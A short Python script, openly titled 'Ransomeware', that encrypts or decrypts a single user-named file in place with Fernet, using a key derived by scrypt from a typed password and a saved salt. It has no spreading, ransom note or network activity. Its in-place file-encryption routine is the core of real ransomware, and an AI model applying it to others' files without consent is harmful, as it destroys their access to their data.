#!/bin/python3

import random, cryptography,pathlib, os, secrets, base64, getpass
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt


def generate_salt():
	"""Generate the salt used for key derivation, `size` is the length of the salt to generate"""
	return secrets.token_bytes()
	
def derive_key(password,salt):
	# Makes a key by password and salt used for furthe control of the programme
	kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
	return kdf.derive(password.encode())

def generate_key(password,load_existing_salt=False, save_salt=True):
	if load_existing_salt:
		with open('salt.salt','rb') as salt_file:
			salt = salt_file.read()
	elif save_salt:
		salt = generate_salt()
		with open('salt.salt','wb') as salt_file:
			salt_file.write(salt)
	key = derive_key(password,salt)
	return base64.urlsafe_b64encode(key)
	
def encrypt(filename,key):
	fer = Fernet(key)
	
	with open(filename,'rb') as file:
		data = file.read()
	encrypted_data = fer.encrypt(data)
	with open(filename,'wb') as file:
		file.write(encrypted_data)

def decrypt(filename, key):
	"""Given a filename (str) and key (bytes), it decrypts the file and write
	it"""
	fer = Fernet(key)
	with open(filename, "rb") as file:
		# read the encrypted data
		encrypted_data = file.read()
	# decrypt data
	try:
		decrypted_data = fer.decrypt(encrypted_data)
	except cryptography.fernet.InvalidToken:
		print("[!] Invalid token, most likely the password is incorrect")
		return
	# write the original file
	with open(filename, "wb") as file:
		file.write(decrypted_data)
		
if __name__ == "__main__":
	print('Welcome To Ransomeware!')
	choice = input('1 for Encryption\n2 for Decryption\n>')
	if choice == '1':
		password = input('Enter Your Password : ')
		file = input('Filename : ')
		key = generate_key(password)
		if os.path.isfile(file):
			# if it is a file, encrypt it
			encrypt(file, key)
	elif choice == '2':
		password = input('Enter Your Password : ')
		file = input('Filename : ')
		if os.path.isfile(file):
			with open('salt.salt','rb') as salt_file:
				# if it is a file, encrypt it
				key=generate_key(password,load_existing_salt=True)
				decrypt(file, key=key)
	else:
		print('Invalid Choice!')
	
	

